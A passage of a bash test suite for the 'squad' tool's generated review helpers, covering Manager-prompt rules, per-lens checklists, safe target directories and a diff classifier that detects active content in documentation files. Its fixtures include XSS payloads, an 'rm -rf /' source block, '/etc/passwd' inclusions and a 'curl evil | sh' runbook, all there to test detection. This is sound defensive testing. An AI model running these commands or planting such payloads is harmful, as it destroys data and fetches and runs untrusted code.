#!/usr/bin/env bash
# Tests for the wiring squad generates for a run: the Manager system prompt, the
# per-lens review checklists, the diff classifier, the lens-result writer and
# the review merge.
#
#   ./test-squad-wiring.sh
#
# Everything runs through `squad gen-helpers <dir>`, which writes the whole
# generated surface and exits without a tmux server, a worktree, a pane or a
# single agent. Stubs for tmux, claude and codex sit first on PATH so that a
# generation step which tried to launch anything would be caught rather than
# silently succeeding.
#
# The token cost of the review phase is what most of these assertions are
# about. The Manager prompt used to paste the whole merged checklist into BOTH
# review task files every round and to command both lenses unconditionally; the
# assertions below pin the replacement rules in place, including the ones that
# must NOT have been relaxed - full-diff review, lens independence, and
# fail-safe skipping.

set -uo pipefail

SQUAD="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/squad"
[[ -f "$SQUAD" ]] || { echo "cannot find squad next to this script" >&2; exit 1; }

PASS=0
FAIL=0

ok() { printf '  ok   %s\n' "$1"; PASS=$((PASS + 1)); }
no() { printf '  FAIL %s\n' "$1"; printf '       %s\n' "${2:-}"; FAIL=$((FAIL + 1)); }

check_eq() {
  local label="$1" want="$2" got="$3"
  if [[ "$want" == "$got" ]]; then ok "$label"; else no "$label" "want [$want] got [$got]"; fi
}

check_ne() {
  local label="$1" a="$2" b="$3"
  if [[ "$a" != "$b" ]]; then ok "$label"; else no "$label" "both were [$a]"; fi
}

check_contains() {
  local label="$1" haystack="$2" needle="$3"
  if [[ "$haystack" == *"$needle"* ]]; then ok "$label"; else no "$label" "missing [$needle]"; fi
}

check_absent() {
  local label="$1" haystack="$2" needle="$3"
  if [[ "$haystack" != *"$needle"* ]]; then ok "$label"; else no "$label" "unexpected [$needle]"; fi
}

check_file() {
  local label="$1" path="$2"
  if [[ -f "$path" ]]; then ok "$label"; else no "$label" "no such file: $path"; fi
}

# This script runs without `set -e`, so mktemp is checked explicitly. An empty
# ROOT would turn every "$ROOT/bin" below into an absolute /bin, and the EXIT
# trap into an `rm -rf` of something that is not ours.
ROOT="$(mktemp -d "${TMPDIR:-/tmp}/squad-wiring-test.XXXXXX")" || exit 1
[[ -n "$ROOT" && -d "$ROOT" ]] || {
  echo "cannot create a temporary directory; refusing to run" >&2
  exit 1
}
trap 'rm -rf "${ROOT:?}"' EXIT

mkdir -p "$ROOT/bin"

# ---------------------------------------------------------------- tmux stub
#
# Logs every invocation and answers nothing. gen-helpers must not call tmux at
# all; one of the assertions below exists precisely to prove that.
cat > "$ROOT/bin/tmux" <<'STUB'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "$TMUX_STUB_LOG"
exit 0
STUB
chmod +x "$ROOT/bin/tmux"

# ------------------------------------------------------- agent binary stubs
#
# If squad ever launched an agent while generating helpers, these record it and
# the assertion below fails. They deliberately do NOT behave like the real CLIs.
for agent_bin in claude codex; do
  cat > "$ROOT/bin/$agent_bin" <<STUB
#!/usr/bin/env bash
printf '$agent_bin %s\n' "\$*" >> "\$AGENT_STUB_LOG"
exit 0
STUB
  chmod +x "$ROOT/bin/$agent_bin"
done

export TMUX_STUB_LOG="$ROOT/tmux.log"
export AGENT_STUB_LOG="$ROOT/agent.log"
: > "$TMUX_STUB_LOG"
: > "$AGENT_STUB_LOG"
export PATH="$ROOT/bin:$PATH"

# Hermetic roots: never the PO's real state or worktrees.
export SQUAD_STATE_ROOT="$ROOT/state"
export SQUAD_WORKTREE_ROOT="$ROOT/worktrees"

# squad hands every subcommand to squad-herdr when this is set outside tmux.
# These tests are about squad's own generation, so make sure it is not.
unset HERDR_PANE_ID

# --no-verify / hooksPath: the PO's global hooks must not run in a test repo.
git_quiet() {
  git -c commit.gpgsign=false -c core.hooksPath=/dev/null "$@"
}

echo "squad wiring tests"
echo ""

# ============================================================== gen-helpers ==
echo "squad gen-helpers (the whole generated surface, nothing launched)"

GEN="$ROOT/gen"
GEN_OUT="$ROOT/gen.out"
"$SQUAD" gen-helpers "$GEN" > "$GEN_OUT" 2>&1
GEN_RC=$?
check_eq "gen-helpers succeeds" "0" "$GEN_RC"
[[ -d "$GEN" ]] || { echo "no generated directory; see $GEN_OUT" >&2; cat "$GEN_OUT" >&2; exit 1; }

check_eq "no agent binary is invoked by gen-helpers" "" "$(cat "$AGENT_STUB_LOG")"
check_eq "no tmux command is invoked by gen-helpers" "" "$(cat "$TMUX_STUB_LOG")"

# gen-helpers writes fixed filenames by plain redirection, and redirection
# follows a symlink already sitting at one of those names. A reused or hostile
# target directory could therefore have squad overwrite any file the caller can
# write, so the target must be one this command can own: absent, or empty.
VICTIM="$ROOT/victim.txt"
printf 'PRECIOUS\n' > "$VICTIM"
HOSTILE="$ROOT/hostile"
mkdir -p "$HOSTILE"
ln -s "$VICTIM" "$HOSTILE/run-coder"
HOSTILE_OUT="$("$SQUAD" gen-helpers "$HOSTILE" 2>&1)"
check_ne "gen-helpers refuses a directory with a pre-existing symlink" "0" "$?"
check_contains "gen-helpers says why it refused" "$HOSTILE_OUT" "not empty"
check_eq "the symlink target is untouched" "PRECIOUS" "$(cat "$VICTIM")"
if [[ -L "$HOSTILE/run-coder" ]]; then
  ok "the symlink itself was not replaced by a generated helper"
else
  no "the symlink itself was not replaced by a generated helper" "it is no longer a symlink"
fi

# The target directory being a symlink is refused too, before anything is
# written inside whatever it points at.
LINKED="$ROOT/linked-target"
mkdir -p "$ROOT/real-target"
ln -s "$ROOT/real-target" "$LINKED"
LINKED_OUT="$("$SQUAD" gen-helpers "$LINKED" 2>&1)"
check_ne "gen-helpers refuses a symlinked target directory" "0" "$?"
check_contains "gen-helpers names the symlink problem" "$LINKED_OUT" "is a symlink"
check_eq "nothing was written through the symlinked directory" "" "$(ls -A "$ROOT/real-target")"

# A target that exists but is not a directory at all.
NOTDIR="$ROOT/not-a-dir"
printf 'x\n' > "$NOTDIR"
"$SQUAD" gen-helpers "$NOTDIR" >/dev/null 2>&1
check_ne "gen-helpers refuses a target that is not a directory" "0" "$?"
check_eq "the non-directory target is untouched" "x" "$(cat "$NOTDIR")"

# An EMPTY directory is still fine: that is what every other case here uses.
mkdir -p "$ROOT/empty-target"
"$SQUAD" gen-helpers "$ROOT/empty-target" >/dev/null 2>&1
check_eq "gen-helpers accepts an existing empty directory" "0" "$?"

check_file "the Manager prompt is generated" "$GEN/manager-prompt.md"
check_file "the resume prompt is generated" "$GEN/manager-resume-prompt.md"
check_file "review-schema.json is generated" "$GEN/review-schema.json"
check_file "the diff classifier is generated" "$GEN/classify-diff"
check_file "the lens-result writer is generated" "$GEN/write-lens-result"
check_file "merge-reviews is generated" "$GEN/merge-reviews"

for helper in classify-diff write-lens-result merge-reviews run-review; do
  check_eq "the generated $helper is valid bash" "0" \
    "$(bash -n "$GEN/$helper" >/dev/null 2>&1; echo $?)"
  if [[ -x "$GEN/$helper" ]]; then
    ok "the generated $helper is executable"
  else
    no "the generated $helper is executable" "not +x: $GEN/$helper"
  fi
done

# review-schema.json is a contract with the separate squad-cockpit repository.
# Five top-level keys, additionalProperties:false, and nothing else.
SCHEMA_KEYS="$(jq -r '.properties | keys | join(",")' "$GEN/review-schema.json")"
check_eq "review-schema.json still has exactly its five keys" \
  "must_fix,should_fix,summary,test_gaps,verdict" "$SCHEMA_KEYS"
check_eq "review-schema.json still refuses extra properties" \
  "false" "$(jq -r '.additionalProperties' "$GEN/review-schema.json")"

echo ""

# ========================================================= the Manager prompt ==
echo "the generated Manager prompt (what it no longer says, and what it must)"

PROMPT="$(cat "$GEN/manager-prompt.md")"

# What the token-cost work removed.
check_absent "the prompt no longer commands pasting the checklist into a task" \
  "$PROMPT" "Paste its contents"
check_absent "the prompt no longer commands running both lenses every round" \
  "$PROMPT" "ALWAYS run BOTH lenses"
check_absent "the prompt does not tell the Manager to cat the merged checklist" \
  "$PROMPT" "cat '$GEN/checklist.merged.md'"

# What must be there instead. The full-diff rule is the one the PO explicitly
# refused to trade away for cheaper rounds.
# Round 1 is still the full diff. What changed is that LATER rounds may narrow
# to the delta - and every failure around that narrowing widens back to full.
check_contains "the prompt keeps round 1 on the full uncommitted diff" \
  "$PROMPT" "Round 1 reviews the FULL uncommitted diff."
check_contains "the prompt states the round-2+ delta rule" \
  "$PROMPT" "Round 2 and later review only what"
check_contains "the prompt makes every delta failure fall back to full" \
  "$PROMPT" "EVERY failure around the delta falls back to the FULL diff"
check_contains "the prompt forbids narrowing a full round by hand" \
  "$PROMPT" "never decide it yourself, and never narrow a full round by hand"
check_contains "the prompt says the delta is the primary scope, not a blindfold" \
  "$PROMPT" "the delta is the PRIMARY"
check_contains "the prompt tells the lens it may read beyond the delta" \
  "$PROMPT" "MAY and SHOULD read the surrounding"
check_contains "the prompt keeps the skip decision on the full change" \
  "$PROMPT" "always computed on the FULL change, never on the"
check_contains "the prompt orders the baseline captured AFTER the review" \
  "$PROMPT" "Run it AFTER the review, never before."
check_contains "the prompt hands each lens only its OWN previous findings" \
  "$PROMPT" "Never the other lens's findings"
check_contains "the prompt states the skip rule in one sentence" \
  "$PROMPT" "A review lens is skipped ONLY when every path the change touches - both"
check_contains "the skip rule sentence names the unknown-means-run part" \
  "$PROMPT" "classifier does not recognise - runs it."
check_contains "the skip rule sentence covers deletions and both rename sides" \
  "$PROMPT" "sides of a rename, and deletions too"
check_contains "the skip rule sentence excludes executables from documentation" \
  "$PROMPT" "non-executable media"
check_contains "the skip rule sentence says the content is read, not the name" \
  "$PROMPT" "read in full and found free of active content"
check_contains "the skip rule sentence names the unreadable cases" \
  "$PROMPT" "large, binary, deleted or unreadable to vouch for"
check_contains "the prompt says a docs extension is not sufficient on its own" \
  "$PROMPT" "A documentation extension is necessary but NOT sufficient"
check_contains "the prompt states the carry-forward rule" \
  "$PROMPT" "Carry-forward is the narrow exception,"
check_contains "the carry-forward rule defaults to re-running" \
  "$PROMPT" "the DEFAULT is re-run"
check_contains "the carry-forward rule resolves doubt by re-running" \
  "$PROMPT" "When in doubt, re-run."
check_contains "the prompt states lens independence as absolute" \
  "$PROMPT" "LENS INDEPENDENCE IS ABSOLUTE"
check_contains "lens independence covers carried and skipped lenses too" \
  "$PROMPT" "re-run lens, for a carried-forward lens and for a skipped one alike"
check_contains "the prompt states the round cap" \
  "$PROMPT" "There is a HARD cap of 3 review rounds"
check_contains "the round cap requires marking PO instead of another fix round" \
  "$PROMPT" "await-po' mark 'review round cap"
check_contains "round 1 still runs both lenses" \
  "$PROMPT" "Round 1, the first review of this run, ALWAYS runs BOTH lenses"

# The per-lens checklists are REFERENCED, and the read is not optional.
check_contains "the correctness task references its own lens checklist" \
  "$PROMPT" "must name $GEN/checklist.correctness.md as a file Advisor MUST"
check_contains "the security task references its own lens checklist" \
  "$PROMPT" "must name $GEN/checklist.security.md as a file Advisor MUST"
check_contains "the prompt requires a files-to-read section" \
  "$PROMPT" 'a "Files to read before reviewing" section'
check_contains "the merged checklist is named as the audit record, not an input" \
  "$PROMPT" "the merged file is the audit record, not a review input"
check_contains "the empty per-lens checklist case still works" \
  "$PROMPT" '(no checklist items)'

# The output contract must stay FIRST in the review task file. That is a
# hard-won property: a lens that answers in prose costs a whole re-run.
check_contains "the output contract is still required first in the task file" \
  "$PROMPT" "### The output contract (put it FIRST in every review task file)"
check_contains "the correctness section repeats that the contract stays first" \
  "$PROMPT" "the contract stays FIRST in"

# ...and the contract section must physically precede both lens sections, or
# the Manager reads the lens instructions before it knows the contract exists.
contract_line="$(grep -n -F -m1 '### The output contract' "$GEN/manager-prompt.md" | cut -d: -f1)"
correctness_line="$(grep -n -F -m1 '### Ask Advisor for a CORRECTNESS review' "$GEN/manager-prompt.md" | cut -d: -f1)"
security_line="$(grep -n -F -m1 '### Ask Advisor for a SECURITY review' "$GEN/manager-prompt.md" | cut -d: -f1)"
if [[ -n "$contract_line" && -n "$correctness_line" && "$contract_line" -lt "$correctness_line" ]]; then
  ok "the output contract section precedes the correctness lens section"
else
  no "the output contract section precedes the correctness lens section" \
    "contract at [$contract_line], correctness at [$correctness_line]"
fi
if [[ -n "$security_line" && "$contract_line" -lt "$security_line" ]]; then
  ok "the output contract section precedes the security lens section"
else
  no "the output contract section precedes the security lens section" \
    "contract at [$contract_line], security at [$security_line]"
fi

# The skip rule sentence lives in the helper AND the prompt, and must not drift.
RULE="A review lens is skipped ONLY when every path the change touches - both"
check_contains "the classifier states the same skip rule sentence" \
  "$(cat "$GEN/classify-diff")" "$RULE"

# The resume prompt is the Manager prompt plus a migration note, so every rule
# above has to survive into it too.
RESUME_PROMPT="$(cat "$GEN/manager-resume-prompt.md")"
check_contains "the resume prompt carries the skip rule too" "$RESUME_PROMPT" "$RULE"
check_absent "the resume prompt does not command pasting the checklist" \
  "$RESUME_PROMPT" "Paste its contents"

echo ""

# ==================================================== per-lens review checklists ==
echo "per-lens checklists (derived from the merged file, nothing lost)"

check_file "checklist.merged.md is still written" "$GEN/checklist.merged.md"
check_file "checklist.correctness.md is generated" "$GEN/checklist.correctness.md"
check_file "checklist.security.md is generated" "$GEN/checklist.security.md"

# The `- [ID] question` parse contract is shared with vet. Only column-0 bullets
# are items, which is what keeps the retired-ID block out of every derived file.
merged_ids="$(sed -n 's/^- \[\([A-Z][A-Z0-9_-]*\)\].*/\1/p' "$GEN/checklist.merged.md" | sort -u)"
correctness_ids="$(sed -n 's/^- \[\([A-Z][A-Z0-9_-]*\)\].*/\1/p' "$GEN/checklist.correctness.md" | sort -u)"
security_ids="$(sed -n 's/^- \[\([A-Z][A-Z0-9_-]*\)\].*/\1/p' "$GEN/checklist.security.md" | sort -u)"

check_ne "the merged checklist actually has items" "" "$merged_ids"

missing=""
for id in $merged_ids; do
  if [[ "$correctness_ids" != *"$id"* && "$security_ids" != *"$id"* ]]; then
    missing="$missing $id"
  fi
done
check_eq "every merged checklist ID lands in at least one lens file" "" "$missing"

# The split has to be a real split, not two copies of the same list.
check_contains "SEC items reach the security lens" "$security_ids" "SEC-001"
check_absent "SEC items do not reach the correctness lens" "$correctness_ids" "SEC-001"
check_contains "COR items reach the correctness lens" "$correctness_ids" "COR-001"
check_absent "COR items do not reach the security lens" "$security_ids" "COR-001"
# Security-adjacent categories genuinely serve both lenses.
for shared_id in DAT-002 ERR-001 COMPAT-001; do
  check_contains "$shared_id serves the correctness lens" "$correctness_ids" "$shared_id"
  check_contains "$shared_id serves the security lens" "$security_ids" "$shared_id"
done

# The vet parse contract again, from the other side: an indented retired ID must
# never appear as an item in anything squad generates.
check_absent "no retired ID leaks into the correctness lens file" \
  "$correctness_ids" "MNT-001"
check_absent "no retired ID leaks into the security lens file" \
  "$security_ids" "INTEG-001"

# An unrecognised prefix is fail-safe: it goes to BOTH lenses rather than
# vanishing from the review.
PROJ="$ROOT/proj-checklist"
mkdir -p "$PROJ"
cat > "$PROJ/checklist.md" <<'CHECKLIST'
# project lenses

- [SEC-001] Project override of the authorization lens?
- [WEIRD-001] Does the thing nobody has a prefix for still get reviewed?
CHECKLIST
GEN_PROJ="$ROOT/gen-proj"
SQUAD_REVIEW_CHECKLIST="$PROJ/checklist.md" "$SQUAD" gen-helpers "$GEN_PROJ" >/dev/null 2>&1
proj_correctness="$(sed -n 's/^- \[\([A-Z][A-Z0-9_-]*\)\].*/\1/p' "$GEN_PROJ/checklist.correctness.md")"
proj_security="$(sed -n 's/^- \[\([A-Z][A-Z0-9_-]*\)\].*/\1/p' "$GEN_PROJ/checklist.security.md")"
check_contains "an unknown ID prefix reaches the correctness lens" "$proj_correctness" "WEIRD-001"
check_contains "an unknown ID prefix reaches the security lens" "$proj_security" "WEIRD-001"

# A lens with no items says so instead of failing.
EMPTY="$ROOT/empty-checklist"
mkdir -p "$EMPTY"
printf '# nothing here\n\nNo items at all.\n' > "$EMPTY/checklist.md"
GEN_EMPTY="$ROOT/gen-empty"
SQUAD_REVIEW_CHECKLIST="$EMPTY/checklist.md" "$SQUAD" gen-helpers "$GEN_EMPTY" >/dev/null 2>&1
check_contains "an empty correctness checklist says so" \
  "$(cat "$GEN_EMPTY/checklist.correctness.md")" "(no checklist items)"
check_contains "an empty security checklist says so" \
  "$(cat "$GEN_EMPTY/checklist.security.md")" "(no checklist items)"

echo ""

# ==================================================================== classifier ==
echo "classify-diff (docs and media skip; anything else, known or not, runs)"

CLASSIFY="$GEN/classify-diff"
CAPTURE="$GEN/capture-review-baseline"

# classify-diff takes seven paths. Wrapping it keeps every call site below
# readable and makes the next arity change one edit instead of thirteen. The
# baseline, delta and changed-file paths are derived from the scope path, so
# each case stays isolated from every other; a test that drives delta rounds
# passes its own baseline path explicitly.
classify() {
  local repo="$1" scope="$2" round="$3" max="$4" baseline="${5:-$2.baseline}"
  "$CLASSIFY" "$repo" "$scope" "$round" "$max" "$baseline" "$scope.delta" "$scope.changed"
}

# Each case gets its own repository so the path list is exactly the files named.
# The scope and round files live OUTSIDE it, or they would be untracked files in
# the very diff being classified.
classify_case() {
  local label="$1"
  shift
  local case_dir scope round
  case_dir="$(mktemp -d "$ROOT/classify.XXXXXX")"
  scope="$case_dir.scope"
  round="$case_dir.round"
  git_quiet init -q "$case_dir/repo" 2>/dev/null
  git_quiet -C "$case_dir/repo" commit -q --allow-empty -m init 2>/dev/null
  local target
  for target in "$@"; do
    mkdir -p "$case_dir/repo/$(dirname "$target")"
    printf 'content\n' > "$case_dir/repo/$target"
  done
  if ! classify "$case_dir/repo" "$scope" "$round" 3 >/dev/null 2>&1; then
    no "$label" "classify-diff exited non-zero"
    return
  fi
  CLASSIFY_SCOPE="$(sed -n 's/^scope=//p' "$scope")"
  CLASSIFY_SECURITY="$(sed -n 's/^security=//p' "$scope")"
  CLASSIFY_CORRECTNESS="$(sed -n 's/^correctness=//p' "$scope")"
}

classify_case "docs only" README.md docs/guide.md docs/screenshot.png
check_eq "a docs-and-media-only diff is classified docs-only" "docs-only" "$CLASSIFY_SCOPE"
check_eq "a docs-only diff may skip the security lens" "skip" "$CLASSIFY_SECURITY"
check_eq "a docs-only diff may skip the correctness lens" "skip" "$CLASSIFY_CORRECTNESS"

# The inert formats that keep the docs-only case meaningful must stay inert, or
# removing the active ones above would have quietly deleted the whole feature.
classify_case "inert docs and media" \
  notes.md guide.rst book.adoc plan.org raw.txt img/a.png img/b.gif clip/c.mp4
check_eq "plain markup and real media are still documentation" \
  "docs-only" "$CLASSIFY_SCOPE"

# ---------------------------------------------------------------------------
# A documentation EXTENSION is necessary but not sufficient: markup can carry
# active content, so the classifier reads the file. These drive one document at
# a time with exact content, alongside an inert baseline document, so the
# verdict can only have come from the document under test.
#
# doc_content_case <label> <filename> <content...>
doc_content_case() {
  local label="$1" name="$2"
  shift 2
  local case_dir
  case_dir="$(mktemp -d "$ROOT/sniff.XXXXXX")"
  git_quiet init -q "$case_dir/repo" 2>/dev/null
  printf 'inert baseline prose\n' > "$case_dir/repo/BASE.md"
  git_quiet -C "$case_dir/repo" add -A 2>/dev/null
  git_quiet -C "$case_dir/repo" commit -qm init 2>/dev/null
  printf '%s' "$*" > "$case_dir/repo/$name"
  classify "$case_dir/repo" "$case_dir.scope" "$case_dir.round" 3 >/dev/null 2>&1
  SNIFF_SCOPE="$(sed -n 's/^scope=//p' "$case_dir.scope")"
  SNIFF_SECURITY="$(sed -n 's/^security=//p' "$case_dir.scope")"
  SNIFF_DIR="$case_dir"
  SNIFF_LABEL="$label"
}

active_doc() {
  doc_content_case "$@"
  check_eq "a document carrying $SNIFF_LABEL runs the security lens" \
    "run" "$SNIFF_SECURITY"
}

inert_doc() {
  doc_content_case "$@"
  check_eq "$SNIFF_LABEL is still documentation" "docs-only" "$SNIFF_SCOPE"
}

active_doc "an HTML script element" doc.md '# Title
<script>alert(1)</script>'
active_doc "an uppercase SCRIPT element" doc.md '<SCRIPT SRC=evil.js>'
active_doc "an iframe" doc.rst 'text
<iframe src=x></iframe>'
active_doc "an object element" doc.md '<object data=x>'
active_doc "an embed element" doc.md '<embed src=x>'
active_doc "an inline svg" doc.md '<svg onload=alert(1)></svg>'
active_doc "an onerror event handler" doc.md '<img src=x onerror=alert(1)>'
active_doc "an uppercase ONLOAD handler" doc.md '<body ONLOAD="go()">'
active_doc "a javascript: URL" doc.md '[click](javascript:alert(1))'
active_doc "a data:text/html URL" doc.md '[x](data:text/html;base64,zz)'
active_doc "a leading shebang" doc.md '#!/bin/sh
echo hi'
active_doc "an org source block" notes.org '#+begin_src sh
rm -rf /
#+end_src'
active_doc "an uppercase org BEGIN_SRC" notes.org '#+BEGIN_SRC emacs-lisp
(shell-command "x")
#+END_SRC'
active_doc "an org file inclusion" notes.org '#+include: "/etc/passwd"'
active_doc "a reStructuredText raw block" doc.rst 'Title
.. raw:: html

   <script>x</script>'
active_doc "an AsciiDoc inclusion" doc.adoc 'include::/etc/passwd[]'
active_doc "an AsciiDoc passthrough" doc.adoc 'pass:[<script>x</script>]'

# The other half of the same rule: sniffing must not flag ordinary prose, or
# every documentation round pays for two lenses and the feature is pointless.
# shellcheck disable=SC2016  # the backticks are literal markdown, not a subshell.
inert_doc "ordinary markdown" doc.md '# Title

Prose, a `code` span, and a list:

- one
- two'
inert_doc "markdown with a fenced shell sample" doc.md '# How to run

```sh
#!/bin/sh
echo hello
```
A shebang inside a fence is a code sample, not a runnable file.'
inert_doc "prose that merely mentions a script" doc.md \
  'This describes the script we run nightly.'
inert_doc "prose with words containing on before an equals sign" doc.md \
  'configuration=yes, monitoring=true, comparison=equal, position=absolute'
inert_doc "plain reStructuredText" doc.rst 'Title
=====

Body text only.'
inert_doc "plain AsciiDoc" doc.adoc '= Title

Body text.'
inert_doc "plain org" notes.org '* Heading
Notes, no source blocks.'
inert_doc "plain text" notes.txt 'just text'
inert_doc "an extensionless README" README 'Project readme, plain prose.'

# Fail-safe: a document whose content cannot be read or vouched for is CODE.
# Deterministic binary, not /dev/urandom: 400 random bytes contain no NUL about
# one run in five, which would make this test flaky rather than wrong.
doc_content_case "binary content" doc.md 'placeholder'
printf '\211PNG\r\n\032\n\000\000\000\015IHDR\000\000\001\000' > "$SNIFF_DIR/repo/doc.md"
classify "$SNIFF_DIR/repo" "$SNIFF_DIR.scope2" "$SNIFF_DIR.round2" 3 >/dev/null 2>&1
check_eq "a binary file with a docs extension is code" \
  "run" "$(sed -n 's/^security=//p' "$SNIFF_DIR.scope2")"

doc_content_case "NUL byte" doc.md 'placeholder'
printf 'a\000b\n' > "$SNIFF_DIR/repo/doc.md"
classify "$SNIFF_DIR/repo" "$SNIFF_DIR.scope2" "$SNIFF_DIR.round2" 3 >/dev/null 2>&1
check_eq "a NUL byte in a docs file makes it code" \
  "run" "$(sed -n 's/^security=//p' "$SNIFF_DIR.scope2")"

doc_content_case "oversized" doc.md 'placeholder'
head -c 1200000 /dev/zero | tr '\0' 'a' > "$SNIFF_DIR/repo/doc.md"
classify "$SNIFF_DIR/repo" "$SNIFF_DIR.scope2" "$SNIFF_DIR.round2" 3 >/dev/null 2>&1
check_eq "a docs file past the sniff bound is code" \
  "run" "$(sed -n 's/^security=//p' "$SNIFF_DIR.scope2")"

doc_content_case "under the bound" doc.md 'placeholder'
head -c 900000 /dev/zero | tr '\0' 'a' > "$SNIFF_DIR/repo/doc.md"
classify "$SNIFF_DIR/repo" "$SNIFF_DIR.scope2" "$SNIFF_DIR.round2" 3 >/dev/null 2>&1
check_eq "a large but readable docs file is still documentation" \
  "skip" "$(sed -n 's/^security=//p' "$SNIFF_DIR.scope2")"

doc_content_case "unreadable" doc.md 'plain prose'
chmod 000 "$SNIFF_DIR/repo/doc.md"
classify "$SNIFF_DIR/repo" "$SNIFF_DIR.scope2" "$SNIFF_DIR.round2" 3 >/dev/null 2>&1
check_eq "an unreadable docs file is code" \
  "run" "$(sed -n 's/^security=//p' "$SNIFF_DIR.scope2")"
chmod 644 "$SNIFF_DIR/repo/doc.md"

# Everything below must RUN the security lens. Each is one of the categories the
# skip rule sentence names out loud, plus an extension nobody has heard of.
run_case() {
  local what="$1"
  shift
  classify_case "$what runs security" "$@"
  check_eq "a $what runs the security lens" "run" "$CLASSIFY_SECURITY"
}

# Formats that LOOK like documentation or media but can carry executable or
# active content by specification. Each of these was on the docs allow-list once
# and skipped the security lens on its own.
run_case "MDX document"        README.md docs/page.mdx
run_case "SVG image"           README.md docs/diagram.svg
run_case "PDF document"        README.md docs/manual.pdf
run_case "Illustrator file"    README.md docs/logo.ai
run_case "HTML page"           README.md docs/index.html

run_case "shell script"        README.md deploy.sh
run_case "config file"         docs/x.md config/database.yml
run_case "dependency lockfile" README.md Gemfile.lock
run_case "CI definition"       README.md .github/workflows/ci.yml
run_case "database migration"  README.md db/migrate/20260101_add_users.rb
run_case "schema file"         README.md db/schema.rb
run_case "routes definition"   README.md config/routes.rb
run_case "template"            README.md app/views/users/index.html.erb
run_case "env sample"          README.md .env.example
run_case "unknown extension"   README.md thing.qqzz
run_case "extensionless file"  README.md bin/deploy
run_case "requirements.txt"    README.md requirements.txt

# An empty diff is not a docs-only diff. It is unclassified, and unclassified
# means run.
classify_case "empty diff"
check_eq "an empty diff is not treated as docs-only" "no-changes" "$CLASSIFY_SCOPE"
check_eq "an empty diff still runs the security lens" "run" "$CLASSIFY_SECURITY"

# A staged code file behind an unstaged docs edit must not look like docs-only.
STAGED_DIR="$(mktemp -d "$ROOT/staged.XXXXXX")"
git_quiet init -q "$STAGED_DIR/repo" 2>/dev/null
git_quiet -C "$STAGED_DIR/repo" commit -q --allow-empty -m init 2>/dev/null
printf 'x\n' > "$STAGED_DIR/repo/app.rb"
git_quiet -C "$STAGED_DIR/repo" add app.rb 2>/dev/null
printf 'x\n' > "$STAGED_DIR/repo/README.md"
classify "$STAGED_DIR/repo" "$STAGED_DIR/scope" "$STAGED_DIR/round" 3 >/dev/null 2>&1
check_eq "a staged code file is not hidden by an unstaged docs edit" \
  "run" "$(sed -n 's/^security=//p' "$STAGED_DIR/scope")"

# ---------------------------------------------------------------------------
# The three ways a real code change used to hide behind a documentation edit.
# Each of these classified as docs-only before the classifier read the diff
# properly, which skipped both lenses and made an UNREVIEWED change look
# reviewed. They need a committed baseline, so they build their own repository.
#
# tracked_case <label> -> sets up $CASE_REPO with README.md and app.rb committed,
# leaving the caller to make the change under test.
tracked_case() {
  CASE_DIR="$(mktemp -d "$ROOT/tracked.XXXXXX")"
  CASE_REPO="$CASE_DIR/repo"
  mkdir -p "$CASE_REPO"
  git_quiet init -q "$CASE_REPO" 2>/dev/null
  printf 'notes\n' > "$CASE_REPO/README.md"
  printf 'puts 1\n' > "$CASE_REPO/app.rb"
  git_quiet -C "$CASE_REPO" add -A 2>/dev/null
  git_quiet -C "$CASE_REPO" commit -qm init 2>/dev/null
}

classify_repo() {
  classify "$CASE_REPO" "$CASE_DIR/scope" "$CASE_DIR/round" 3 >/dev/null 2>&1
  CLASSIFY_SCOPE="$(sed -n 's/^scope=//p' "$CASE_DIR/scope")"
  CLASSIFY_SECURITY="$(sed -n 's/^security=//p' "$CASE_DIR/scope")"
  CLASSIFY_FIRST_CODE="$(sed -n 's/^first_code_path=//p' "$CASE_DIR/scope")"
}

# 1. A DELETED code file alongside a docs edit. --diff-filter=ACMRT dropped
#    status D, so this was the original docs-only false negative.
tracked_case
rm "$CASE_REPO/app.rb"
printf 'more notes\n' >> "$CASE_REPO/README.md"
classify_repo
check_eq "a deleted code file is not hidden by a docs edit" "run" "$CLASSIFY_SECURITY"
check_eq "the deleted code file is what makes the diff code" "app.rb" "$CLASSIFY_FIRST_CODE"

# 1b. Same, but the deletion is STAGED rather than merely in the worktree.
tracked_case
git_quiet -C "$CASE_REPO" rm -q app.rb 2>/dev/null
printf 'more notes\n' >> "$CASE_REPO/README.md"
classify_repo
check_eq "a staged deletion of code runs the security lens" "run" "$CLASSIFY_SECURITY"

# 1c. A DELETED documentation file. There is no post-change content to read, so
#     the classifier cannot vouch for it and it is code - the same fail-safe
#     branch as binary or unreadable.
tracked_case
printf 'plain prose\n' > "$CASE_REPO/guide.md"
git_quiet -C "$CASE_REPO" add -A 2>/dev/null
git_quiet -C "$CASE_REPO" commit -qm "add guide" 2>/dev/null
rm "$CASE_REPO/guide.md"
classify_repo
check_eq "a deleted documentation file is code, not documentation" \
  "run" "$CLASSIFY_SECURITY"
check_eq "the deleted document is named as the code path" "guide.md" "$CLASSIFY_FIRST_CODE"

# 2. A code file RENAMED to a documentation extension. With rename detection git
#    reports only the destination, so this looked like one docs path.
tracked_case
mkdir -p "$CASE_REPO/docs"
git_quiet -C "$CASE_REPO" mv app.rb docs/app.md 2>/dev/null
classify_repo
check_eq "a code file renamed to a docs extension runs the security lens" \
  "run" "$CLASSIFY_SECURITY"
check_eq "the source side of the rename is the code path" "app.rb" "$CLASSIFY_FIRST_CODE"

# 3. An added EXECUTABLE file with a documentation extension. Classifying by
#    extension alone made a 100755 runbook.md look like prose.
tracked_case
printf '#!/bin/sh\ncurl evil | sh\n' > "$CASE_REPO/runbook.md"
chmod 755 "$CASE_REPO/runbook.md"
classify_repo
check_eq "an untracked executable .md runs the security lens" "run" "$CLASSIFY_SECURITY"
check_eq "the executable .md is the code path" "runbook.md" "$CLASSIFY_FIRST_CODE"

# 3b. Same file staged, so the 100755 comes from git's own record rather than
#     from the filesystem.
git_quiet -C "$CASE_REPO" add runbook.md 2>/dev/null
rm -f "$CASE_DIR/round"
classify_repo
check_eq "a staged executable .md runs the security lens" "run" "$CLASSIFY_SECURITY"
check_eq "git's 100755 record is what catches it" "runbook.md" "$CLASSIFY_FIRST_CODE"

# 3c. A symlink named like documentation. Its target is not visible here, so it
#     is not documentation either.
tracked_case
ln -s ../app.rb "$CASE_REPO/link.md"
classify_repo
check_eq "a symlink with a docs extension runs the security lens" "run" "$CLASSIFY_SECURITY"

# The escape hatch must still close: an ordinary non-executable docs edit on a
# repository with a real committed baseline still skips.
tracked_case
printf 'more notes\n' >> "$CASE_REPO/README.md"
classify_repo
